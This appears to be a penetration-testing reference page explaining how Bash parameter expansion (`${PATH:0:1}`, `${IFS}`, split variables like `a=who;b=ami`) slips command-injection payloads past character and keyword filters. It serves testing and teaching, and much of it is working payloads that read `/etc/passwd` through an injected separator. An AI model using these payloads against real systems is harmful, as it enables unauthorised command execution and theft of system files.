---
title: "Command injection filter bypass with variable and parameter expansion"
description: "Assembling commands from shell parameter expansion—${PATH:0:1} for /, ${IFS} for whitespace, substring and pattern substitution—so the forbidden characters and keywords never appear as literals in the request."
keywords:
  - command injection
  - parameter expansion
  - variable expansion
  - IFS
  - substring expansion
  - filter bypass
---

# Variable and parameter expansion

Bash parameter expansion reads and transforms environment variables inline: `${VAR}`, substring slices `${VAR:offset:length}`, and pattern substitution `${VAR//find/replace}`. Because the shell resolves these to their values before running the command, an attacker can assemble forbidden characters and even whole command names out of fragments of existing variables—never typing the blocked literal itself.

> **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you are contracted to assess. Executing commands without written authorization is unlawful.

## Why the shell normalizes it away

Parameter expansion runs before word splitting and execution. `${PATH:0:1}` takes the first character of `$PATH`—almost always `/`—so the shell emits a slash that the attacker never wrote. `${IFS}` expands to the internal field separator (space/tab/newline), providing whitespace where a space filter blocks the literal character. The filter inspects `${PATH:0:1}` or `${IFS}` and sees no `/` and no space; the shell substitutes them at runtime. The payload crosses the filter as variable syntax and arrives at the command as the real characters.

## Core primitives

Produce a slash without typing one:

```
${PATH:0:1}            # first char of PATH → "/"
${HOME:0:1}            # first char of HOME → "/"
${PWD:0:1}             # "/" from current dir
```

Produce whitespace without a space:

```
cat${IFS}/etc/passwd
cat${IFS%??}/etc/passwd   # trim trailing chars of IFS if needed
```

Assemble a path entirely from fragments—`/etc/passwd` with no literal slash:

```
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

## Building command names from variables

Substring slices can carve letters out of known variable values, and pattern substitution can rewrite characters—useful when the command name itself is blocklisted:

```
# $0 is often "bash"; slice/transform to reach other words
${HOME:0:1}                      # "/"
${SHELL##*/}                     # "bash" from /bin/bash
```

Pattern substitution rewrites a value to forge a new string. For example, transforming a variable that contains a near-miss of the target command:

```
x=whoami; ${x/whoami/whoami}     # trivial illustration of substitution syntax
${PATH//:/ }                     # turn PATH separators into spaces to spray words
```

More practically, define a throwaway variable in the injected context and expand it, so no blocked keyword appears contiguously:

```
a=who;b=ami;$a$b                 # concatenated expansion runs "whoami"
c=/etc/;cat ${c}passwd           # path split across a variable
```

The shell concatenates `$a$b` into `whoami` at expansion time; the request contains only `who`, `ami`, and the assignment syntax.

## Combining with other tricks

Variable expansion composes with brace expansion, globbing, and separators:

```
{cat,${PATH:0:1}etc${PATH:0:1}passwd}
127.0.0.1;cat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
```

Each piece is produced by the shell, so a literal blocklist for `/`, spaces, or `/etc/passwd` has nothing to match.

## Operational notes

- Substring expansion (`${VAR:offset:length}`) and pattern substitution (`${VAR/a/b}`) are **Bash** features, not POSIX `sh`; confirm the sink spawns Bash. `${IFS}` and simple `${VAR}` work more broadly.
- `${IFS}` defaults to space-tab-newline; a single `${IFS}` typically word-splits into one separator, which is enough between a command and its argument.
- Variable values depend on the child process environment—`PATH`, `HOME`, and `PWD` are reliably present; others may not be.

## References

- [PayloadsAllTheThings: Command Injection — Bypass without space / characters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bash Reference Manual: Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
